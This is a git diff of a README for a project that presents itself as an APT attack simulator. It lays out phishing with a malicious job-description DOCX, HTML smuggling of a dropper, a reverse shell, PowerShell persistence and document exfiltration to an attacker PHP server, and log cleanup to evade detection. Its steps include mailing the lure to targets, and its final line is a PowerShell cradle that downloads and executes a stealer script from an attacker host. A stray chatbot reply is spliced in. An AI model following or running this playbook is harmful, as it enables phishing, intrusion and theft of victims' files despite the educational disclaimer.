@@ -1,94 +1,77 @@
-# APT Simulator Project
+# APT Simulation - Advanced Persistent Threat Attack
 
-## Introduction
+This project simulates an **Advanced Persistent Threat (APT)** attack, covering multiple stages from initial phishing to data exfiltration. The simulation is designed for educational and cybersecurity awareness purposes in a **controlled environment** such as VirtualBox.
 
-This project is an **Advanced Persistent Threat (APT) Simulator** designed for **educational and security research purposes**. It replicates the attack chain of a real-world APT, from **initial phishing** to **document exfiltration** and **persistence mechanisms**.
+## **Stages of the Attack**
 
-**⚠ Disclaimer:** This project is strictly for **educational** and **research** purposes. Running these scripts outside a controlled environment is illegal.
+### **1. Phishing (Initial Access)**
 
----
+- A malicious **job description document (.docx)** is sent to the target.
+- The document contains a **link to an HTML Smuggling page** that automatically downloads the initial dropper (**dropper.exe**).
 
-## Architecture
+### **2. HTML Smuggling (Dropper Execution)**
 
-The attack follows these stages:
+- When the target opens the link, **dropper.exe** is downloaded without triggering security warnings.
+- If the user executes **dropper.exe**, it downloads additional payloads from the attacker's server.
 
-1. **Phishing Attack** – A **Word document (DOCX)** containing a fake job description and a **malicious link**.
-2. **HTML Smuggling** – When the link is clicked, it downloads `dropper.exe` without raising suspicion.
-3. **Execution of Dropper** – When executed, the dropper:
-   - **Downloads & executes a shellcode (reverse shell)** from the attacker's server.
-   - **Executes a PowerShell script for persistence & data exfiltration**.
-4. **Data Exfiltration** – The PowerShell script collects **document files** (`.txt`, `.pdf`, `.xlsx`, etc.) and uploads them to the attacker's PHP web server.
-5. **Persistence** – Hijacks file associations to maintain access.
+### **3. Payload Deployment (Execution & Persistence)**
 
----
+- The dropper downloads **shellcode (reverse shell)** from the attacker's server.
+- A **PowerShell script** is executed to establish **persistence** via **Hijacking File Associations**.
 
-## Components
+### **4. Privilege Escalation & Lateral Movement**
 
-### 1. **Dropper (C Language)**
+- If necessary, privilege escalation techniques are attempted.
+- The attacker explores ways to move laterally within the target network.
 
-- Downloads and executes shellcode (reverse shell) from an external server.
+### **5. Data Exfiltration (Document Theft)**
 
-### 2. **PowerShell Script**
+- A **PowerShell document stealer** searches for sensitive files (**.txt, .pdf, .xlsx, .csv**).
+- Stolen files are uploaded to a **remote PHP web server** controlled by the attacker.
 
-- Searches for **sensitive documents** on the victim's machine.
-- Uploads collected files to the attacker's server.
-- Implements **persistence** using **Hijacking File Associations**.
+### **6. Cleanup & Covering Tracks**
 
-### 3. **HTML Smuggling Page**
+- Log files and traces of execution are removed to evade detection.
+- Persistence mechanisms remain in place for future access.
 
-- Designed to **silently download** the dropper when opened in a browser.
+## **Components**
 
-### 4. **Phishing Document (DOCX)**
+- **Dropper (C)**: Downloads & executes payloads.
+- **Reverse Shell (C & Windows API)**: Establishes attacker connection.
+- **PowerShell Scripts**: Handles persistence & document exfiltration.
+- **PHP Web Server**: Receives stolen files.
+- **HTML Smuggling (HTML & JavaScript)**: Bypasses browser security controls.
+- **Phishing Document (DOCX)**: Social engineering bait.
 
-- A fake **job portal description** that tricks users into clicking the HTML Smuggling link.
+## **How to Set Up the Simulation**
 
-### 5. **PHP Web Server**
+### **1. Configure Virtual Environment**
 
-- Acts as a **C2 server** to receive exfiltrated documents.
+- Use **VirtualBox** with a **Windows VM** as the target.
+- Set up an **attacker machine (Kali Linux/Ubuntu)** for control.
 
----
+### **2. Start the Web Server**
 
-## Installation & Setup
+```bash
+php -S 0.0.0.0:8080 -t /path/to/upload_server/
+```
 
-### **1. Virtual Environment**
+### **3. Send the Phishing Document**
 
-To ensure safety, run the simulator inside **VirtualBox** with:
+- Distribute the **malicious job description (.docx)** via email or messaging platforms.
 
-- **1x Windows VM (Target)** – Victim machine.
-- **1x Linux VM (Attacker)** – Hosting the C2 server & shellcode.
+### **4. Monitor the Attack Progress**
 
-### **2. Setting Up the Web Server**
+- Wait for the victim to execute **dropper.exe**.
+- Capture the **reverse shell connection**.
+- Extract stolen data from the PHP web server.
 
-1. Install Apache & PHP on Linux:
-   ```bash
-   sudo apt update && sudo apt install apache2 php -y
-   sudo systemctl start apache2
-   sudo systemctl enable apache2
-   ```
-2. Deploy the PHP upload server:
-   - Copy `index.php` to `/var/www/html/upload/`
-   - Ensure `/upload/` directory has write permissions.
+## **Disclaimer**
 
-### **3. Running the Attack**
-
-1. Send the phishing **DOCX** to the target.
-2. Wait for the victim to click the link.
-3. The dropper gets executed.
-4. Reverse shell is established & documents get uploaded.
+This project is strictly for **educational purposes**. Unauthorized use of these techniques on real systems **without permission** is illegal and may result in serious legal consequences. Use this simulation in a controlled and isolated environment only.
 
 ---
 
-## Security & Ethical Considerations
+Let me know if you need **further refinements or additional details!** 🔥
 
-- This project is meant for **ethical hacking**, **cybersecurity training**, and **malware research**.
-- Never deploy this outside a **controlled lab environment**.
-- Ensure all VMs are **isolated from real networks**.
-
----
-
-## Future Improvements
-
-- Implement **better encryption** for exfiltrated data.
-- Enhance **stealth techniques** to bypass AV detections.
-
-If you have suggestions or improvements, feel free to contribute! 🚀
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://attacker_ip/docs-stealer.ps1')"
